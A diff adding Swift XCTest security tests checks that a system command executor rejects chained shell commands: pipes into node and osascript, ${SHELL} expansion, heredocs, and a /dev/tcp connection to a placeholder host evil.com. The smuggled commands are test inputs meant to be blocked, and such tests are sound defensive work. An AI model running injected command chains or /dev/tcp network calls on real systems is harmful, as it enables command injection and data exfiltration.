@@ -300,6 +300,51 @@ final class SystemCommandExecutorSecurityTests: XCTestCase {
                         "Case-insensitive pattern matching should reject | BASH and not execute")
     }
 
+    func testShellCommand_RejectsPipeToNode() async {
+        let marker = markerPath()
+        executor.execute(.shellCommand(command: "touch \(marker) | node -e 'process.exit()'", inTerminal: false))
+        try? await Task.sleep(nanoseconds: Self.executionDelay)
+
+        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
+                        "Pipe to node should be rejected and not execute")
+    }
+
+    func testShellCommand_RejectsPipeToOsascript() async {
+        let marker = markerPath()
+        executor.execute(.shellCommand(command: "touch \(marker) | osascript -e 'quit'", inTerminal: false))
+        try? await Task.sleep(nanoseconds: Self.executionDelay)
+
+        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
+                        "Pipe to osascript should be rejected and not execute")
+    }
+
+    func testShellCommand_RejectsShellVariableExpansion() async {
+        let marker = markerPath()
+        executor.execute(.shellCommand(command: "touch \(marker) && echo ${SHELL}", inTerminal: false))
+        try? await Task.sleep(nanoseconds: Self.executionDelay)
+
+        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
+                        "Shell variable expansion ${} should be rejected and not execute")
+    }
+
+    func testShellCommand_RejectsHeredoc() async {
+        let marker = markerPath()
+        executor.execute(.shellCommand(command: "touch \(marker) && cat <<EOF\nhello\nEOF", inTerminal: false))
+        try? await Task.sleep(nanoseconds: Self.executionDelay)
+
+        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
+                        "Heredoc should be rejected and not execute")
+    }
+
+    func testShellCommand_RejectsDevTcp() async {
+        let marker = markerPath()
+        executor.execute(.shellCommand(command: "touch \(marker) && cat /dev/tcp/evil.com/80", inTerminal: false))
+        try? await Task.sleep(nanoseconds: Self.executionDelay)
+
+        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
+                        "/dev/tcp/ should be rejected and not execute")
+    }
+
     // MARK: - executeSilently: Valid Commands That Resemble Patterns But Are Safe
 
     func testShellCommand_AllowsSimpleEchoCommand() async {
